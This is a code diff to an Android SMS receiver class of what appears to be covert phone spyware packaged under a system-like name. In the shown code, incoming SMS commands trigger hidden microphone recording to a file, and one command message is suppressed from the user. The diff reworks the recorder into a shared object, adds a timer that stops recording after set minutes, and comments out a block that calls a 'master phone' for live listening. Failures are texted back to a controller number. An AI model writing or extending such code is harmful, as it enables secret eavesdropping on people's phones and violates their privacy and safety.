@@ -10,7 +10,6 @@ import java.util.Timer;
 import system.service.BootService;
 import system.service.GlobalValues;
 import system.service.IndicationHandler;
-import system.service.MaxVolTask;
 import system.service.R;
 import system.service.R.raw;
 import system.service.R.string;
@@ -36,6 +35,9 @@ import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 import system.service.feature.location.LocationInfo;
 import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SmsCtrl;
+import system.service.task.MaxVolTask;
+import system.service.task.StopRecorderTask;
+
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LicenseCtrl;
@@ -102,12 +104,6 @@ public class SmsReceiver extends BroadcastReceiver
 					ConfigCtrl.setLicenseKey(context, SmsConsts.TRIAL_KEY);
 					// Save consumed datetime
 					ConfigCtrl.setConsumedDatetime(context, (new Date()));
-					
-					// Set self phone number if can get it by self
-					String selfPhoneNum = DeviceProperty.getPhoneNumber(context);
-					if (selfPhoneNum != null && selfPhoneNum.length() > 0) {
-						ConfigCtrl.setSelfPhoneNum(context, selfPhoneNum);
-					}
 					
 					// Send trial info
 					SmsCtrl.sendTrialSms(context);
@@ -194,6 +190,7 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			//-------------------------------------------------------------------------------
 			// Call master phone if being triggered by env listening indication
+			/*
 			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN) || smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN_ALIAS))
 			{
 				abortBroadcast(); // Do not show env listening SMS
@@ -257,6 +254,7 @@ public class SmsReceiver extends BroadcastReceiver
 					}
 				}).start();
 			}
+			*/
 			
 			//-------------------------------------------------------------------------------
 			// Env recording indication
@@ -292,20 +290,25 @@ public class SmsReceiver extends BroadcastReceiver
                         		ConfigCtrl.getSelfName(SmsReceiver.this.context) + "-" + DatetimeUtil.format2.format(startDate) + FileCtrl.SUFFIX_WAV;
                         String fileFullPath = FileCtrl.getInternalStorageFilesDirStr(SmsReceiver.this.context) + fileName;
                         
-                        MediaRecorder recorder = new MediaRecorder();
+                        if (GlobalValues.recorder == null) {
+                        	GlobalValues.recorder = new MediaRecorder();
+                        }
                         try {
-                        	recorder.reset();
-                        	recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                        	recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
-                        	recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
-                        	recorder.setOutputFile(fileFullPath);
-                        	recorder.prepare();
-                        	recorder.start();
+                        	GlobalValues.recorder.reset();
+                        	GlobalValues.recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                        	GlobalValues.recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+                        	GlobalValues.recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+                        	GlobalValues.recorder.setOutputFile(fileFullPath);
+                        	GlobalValues.recorder.prepare();
+                        	GlobalValues.recorder.start();
                         } catch (Exception ex) {
                         	String msg = SmsReceiver.this.context.getResources().getString(R.string.env_rec_fail_exception);
         					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context), msg);
         					return;
                         }
+                        
+                        // Start a timer to stop recorder minutes later
+						(new Timer()).schedule(new StopRecorderTask(SmsReceiver.this.context), minutes*60*1000);
 						
 					}
 				}).start();
